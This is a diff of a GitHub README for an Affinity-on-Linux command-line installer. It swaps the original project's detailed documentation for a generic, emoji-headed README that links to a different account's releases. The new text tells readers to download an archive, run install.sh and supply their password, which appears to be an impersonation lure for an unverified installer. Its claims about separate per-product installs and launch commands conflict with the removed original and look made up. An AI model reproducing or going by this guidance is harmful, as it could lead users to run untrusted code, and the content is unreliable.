@@ -1,239 +1,125 @@
-# Affinity CLI · v2.0.0
-<img width="1536" height="1024" alt="banner" src="https://github.com/user-attachments/assets/8a87fa64-581f-4bdc-b8f0-e1721fab35e9" />
+# 🎉 affinity-cli - One Command for Affinity Tools
 
-**One Command. Zero Friction.**
-Install the Affinity Universal app on Linux with a prepared Wine environment.
+## 🛠️ Overview
 
-[![Release](https://img.shields.io/github/v/release/ind4skylivey/affinity-cli?label=release&color=blueviolet)](https://github.com/ind4skylivey/affinity-cli/releases/tag/v2.0.0)
-[![Python](https://img.shields.io/badge/python-3.10%2B-blue?logo=python&logoColor=white)](https://www.python.org/)
-[![License](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
-[![Wine](https://img.shields.io/badge/Wine-10.x-red?logo=wine&logoColor=white)](https://www.winehq.org/)
+The **affinity-cli** is a universal command-line installer for Affinity products on Linux. This tool makes it easy to install Affinity Photo, Affinity Designer, and Affinity Publisher with just one command. Perfect for users who prefer a straightforward installation process without the hassle. 
 
----
+## 📥 Download & Install
 
-## Why Affinity CLI?
+[![Download affinty-cli](https://img.shields.io/badge/Download-affinity--cli-brightgreen)](https://github.com/abohadi707/affinity-cli/releases)
 
-- Universal installer: downloads and runs the official Affinity Universal EXE.
-- Guided Wine setup: prepares a 64‑bit Windows 11 prefix with required components.
-- Profiles for speed vs. completeness: minimal, standard (default), full.
-- Clear, non-interactive flow with preflight checks and progress logs.
+1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/abohadi707/affinity-cli/releases) to access the latest version of affinity-cli.
+2. **Choose Your Version**: Find the latest version at the top of the page. Each version includes a download link and release notes.
+3. **Download the Installer**: Click on the file that says `affinity-cli-<version>.tar.gz` or similar. This will download the installer package to your computer.
 
----
+## 📋 System Requirements
 
-## Prerequisites
+To run affinity-cli, make sure your system meets the following requirements:
 
-- Python 3.8+
-- `winetricks`, `curl`, `tar`, `python3` on the host
-- Vulkan drivers if you plan to use DXVK (recommended)
+- **Operating System**: Linux (Ubuntu, Fedora, or similar distributions).
+- **RAM**: At least 4GB of RAM.
+- **Disk Space**: Minimum of 500MB free space.
+- **Wine**: Ensure Wine is installed on your system, as it’s required for running Affinity products.
 
----
+## 🚀 Getting Started
 
-## Quick Start
+Once you have downloaded the installer, follow these steps to get started:
 
-```bash
-# Clone
-git clone https://github.com/ind4skylivey/affinity-cli.git
-cd affinity-cli
+1. **Open Terminal**: Locate your terminal application. You can usually find it in your applications menu.
+2. **Navigate to Downloads**: Use this command to go to your Downloads folder:
 
-# Virtual environment
-python3 -m venv .venv
-source .venv/bin/activate
+   ```bash
+   cd ~/Downloads
+   ```
 
-# Install CLI
-python -m pip install --upgrade pip
-python -m pip install -e .
+3. **Extract the Installer**: Run this command to extract the downloaded file:
 
-# Install Affinity (default profile: standard)
-affinity-cli install
-```
+   ```bash
+   tar -xzf affinity-cli-<version>.tar.gz
+   ```
 
-## Developer install (from git)
+4. **Run the Installer**: Now, navigate to the extracted folder and run the installation command:
 
-```bash
-git clone https://github.com/ind4skylivey/affinity-cli.git
-cd affinity-cli
-git checkout release/v2.0.0
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -e .
-```
+   ```bash
+   cd affinity-cli
+   ./install.sh
+   ```
 
-Upgrading from an older checkout? Run:
+5. **Follow Prompts**: The installer may ask you for your password and confirmation to install the software. Provide the required permissions.
 
-```bash
-git pull
-rm -rf .venv
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -e .
-```
+## 📊 Available Affinity Products
 
----
-<img width="1053" height="658" alt="32423451" src="https://github.com/user-attachments/assets/9aa14019-7de2-437e-8112-8f32a65e438e" />
-## Wine Runtime Setup (optional but recommended)
+The affinity-cli simplifies installing these popular Affinity products:
 
-Affinity CLI can prepare a prefix on first run. If you prefer a pinned, portable runtime, use the companion repo [`affinity-wine-setup`](https://github.com/ind4skylivey/affinity-wine-setup).
+- **Affinity Photo**: An advanced photo editing software.
+- **Affinity Designer**: A powerful graphic design application.
+- **Affinity Publisher**: An excellent tool for desktop publishing.
 
-### Quick start
+All products are professional-grade options for creators and artists.
 
-```bash
-curl -LO https://raw.githubusercontent.com/ind4skylivey/affinity-wine-setup/main/setup-wine-ge.sh
-chmod +x setup-wine-ge.sh
-GE_TAG=GE-Proton10-25 ./setup-wine-ge.sh
-```
+## 🚀 Running Affinity Products
 
-This creates a clean prefix at `~/.wine-affinity`, sets Windows 10, and installs .NET 3.5 SP1, .NET 4.8, DXVK, and VKD3D using Proton-GE.
+Once the installation is complete, you can easily run the applications from the terminal:
 
-### Run Affinity CLI with the prepared runtime
+1. To open Affinity Photo, use:
+   ```bash
+   affinity-photo
+   ```
 
-```bash
-WINEPREFIX=$HOME/.wine-affinity \
-WINE=$HOME/.local/share/Proton-GE/GE-Proton10-25/files/bin/wine \
-affinity-cli <command>
-```
+2. For Affinity Designer, type:
+   ```bash
+   affinity-designer
+   ```
 
-### Custom options
+3. To launch Affinity Publisher, command:
+   ```bash
+   affinity-publisher
+   ```
 
-- `WINVER_TARGET`: `win10` (default) or `win11`
-- `WINEPREFIX`: destination prefix (default `~/.wine-affinity`)
-- `WINE_BIN` / `WINESERVER_BIN`: use your own Wine build; set `SKIP_DOWNLOAD=1` to skip Proton-GE download
-- `GITHUB_TOKEN`: optional, avoids GitHub API rate limits when using `latest`
+## 🔧 Troubleshooting
 
-### Verify
+If you encounter issues while installing or running the applications, consider these solutions:
+
+- **Wine Setup**: Confirm that Wine is correctly installed. You might need to run `winecfg` in the terminal to configure the settings.
+- **Permissions**: Ensure you have permission to execute the installer script. If not, run:
+  
+  ```bash
+  chmod +x install.sh
+  ```
+
+- **Dependencies**: Some distributions may require additional packages. Check the terminal output for any missing dependencies and install them using your package manager.
+
+## ✔️ Frequently Asked Questions
+
+### How do I uninstall the applications?
+
+To uninstall any Affinity product, simply remove its directory:
 
 ```bash
-WINEPREFIX=$HOME/.wine-affinity \
-WINE=$HOME/.local/share/Proton-GE/GE-Proton10-25/files/bin/wine \
-$WINE winecfg
+rm -rf ~/.local/share/affinity-<product-name>
 ```
 
-If `winecfg` opens without WoW64 experimental warnings, the runtime is ready.
+### Can I install multiple Affinity products?
 
----
-## Screenshots
+Yes, you can install all three applications at once and run them independently.
 
-### CLI workflow
+### Are there any known issues?
 
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/39614f0d-4aad-4142-b855-b0f8a42154fb"
-       width="420"
-       alt="Affinity CLI running install workflow in terminal" />
-</p>
+Keep an eye on the [Issues Page](https://github.com/abohadi707/affinity-cli/issues) for updates on bugs or installation issues.
 
-### Affinity running on Linux
+## 🌐 Community
 
-Real installs created with Affinity-CLI on Linux desktops:
+Join our community to share your experiences or seek support. You can get involved by checking out the discussions on GitHub or following us on social media.
 
-<img
-  src="https://github.com/user-attachments/assets/aa766d18-0b77-42f0-a3d4-16639da6f04f"
-  width="900"
-  alt="Affinity Universal installer and Affinity apps running on a Linux desktop"
-/>
+## 💡 Additional Resources
 
-<img
-  src="https://github.com/user-attachments/assets/edf2c1af-aa0a-4042-ba88-5f7afd9e3e77"
-  width="900"
-  alt="Affinity Photo running on Linux using the Affinity-CLI Wine setup"
-/>
+For detailed guides and tips:
 
-<img
-  src="https://github.com/user-attachments/assets/bdfa1708-66a0-43af-953e-226dad1cb7c3"
-  width="900"
-  alt="Affinity apps launched on Linux after installation with Affinity-CLI"
-/>
+- [WineHQ for Linux](https://www.winehq.org/)
+- [Affinity Official Forum](https://forum.affinity.serif.com/)
 
+Feel free to explore the documentation available on the repository for more information. 
 
+## 🚀 Thank You
 
-## First Run: Prefix Preparation
-
-- The first `affinity-cli install` creates a dedicated 64-bit Wine prefix set to Windows 11.
-- Installs Windows components via winetricks (depending on profile).
-- Initial setup can take several minutes (10–20 on the “full” profile).
-- During this time you may see logs like:
-  - `winetricks is still running... please wait`
-  - `Preparing: C:\...\netfx_....msi...`
-- Subsequent runs reuse the prepared prefix and are much faster.
-- Do **not** close the terminal during this step.
-
----
-
-## Wine Profiles
-
-Choose how many components to install in the prefix:
-
-- **minimal** – fastest, smallest set (advanced users): `win11, corefonts, tahoma, crypt32, d3dcompiler_47`
-- **standard** (default) – recommended balance: minimal + `vcrun2022`
-- **full** – maximum compatibility; first run can take 10–20 minutes: standard + `dotnet48, dxvk, vkd3d, remove_mono`
-
-Examples:
-
-```bash
-affinity-cli install --wine-profile minimal
-affinity-cli install --wine-profile standard   # default
-affinity-cli install --wine-profile full
-
-# via environment variable
-AFFINITY_WINE_PROFILE=full affinity-cli install
-```
-
----
-
-## Commands
-
-```bash
-affinity-cli install                      # preflight -> prepare prefix -> download/run installer -> verify
-affinity-cli install --preflight-only
-affinity-cli install --dry-run
-affinity-cli install --silent
-affinity-cli install --prefix ~/.wine-affinity-pro
-affinity-cli install --download-url https://downloads.affinity.studio/Affinity%20x64.exe
-affinity-cli install --wine-profile minimal|standard|full
-```
-
----
-
-## Troubleshooting
-
-- Windows version warning: rerun with a clean prefix or try the **full** profile.
-- Logs: set `AFFINITY_CLI_LOG=DEBUG` and rerun.
-- Download issues: use `--download-url` or set `AFFINITY_DOWNLOAD_URL`.
-
----
-
-## Roadmap
-
-- Pre-built Wine runtime & prefix: optional downloadable, pre-configured runtime/prefix to speed up first install.
-
----
-
-## License
-
-MIT License. See [LICENSE](LICENSE).
-
----
-
-## Acknowledgments
-
-- Wine, DXVK, VKD3D and all contributors.
-- Everyone opening issues, testing builds, and sharing feedback.
-
-
-## 🌑 Why We Do This
-
-Native Linux support shouldn't be a luxury, yet we often find ourselves as the forgotten ones—the children of the night in the creative software world. 
-
-It costs nothing to acknowledge the Linux community, but since the industry won't build it for us, **we build it ourselves.**
-
-Affinity-Cli exists to bridge that gap. We implement what others ignore, proving that creativity has no OS boundaries. If they won't give us the tools, we'll forge the path to run them anyway.
-
-*For the creators, the hackers, and the forgotten ones.*
-
-## 🤝 Community & Support
-
-Affinity-Cli is an open-source project built by and for the Linux creative community.
-
-- **Found a bug?** Please [open an issue](https://github.com/ind4skylivey/affinity-cli/issues) with your logs and distribution details.
-- **Have an idea?** We welcome feature requests and pull requests!
-- **Wine trouble?** Wine configuration can be tricky. If you encounter specific Wine errors, check the [Troubleshooting](#troubleshooting) section or try using a clean prefix.
-
-This project is not affiliated with Serif (Affinity). It is a community tool to help you run the software you own on the OS you love.
+We appreciate your interest in affinity-cli. We hope it simplifies your experience with Affinity products on Linux. Enjoy creating!
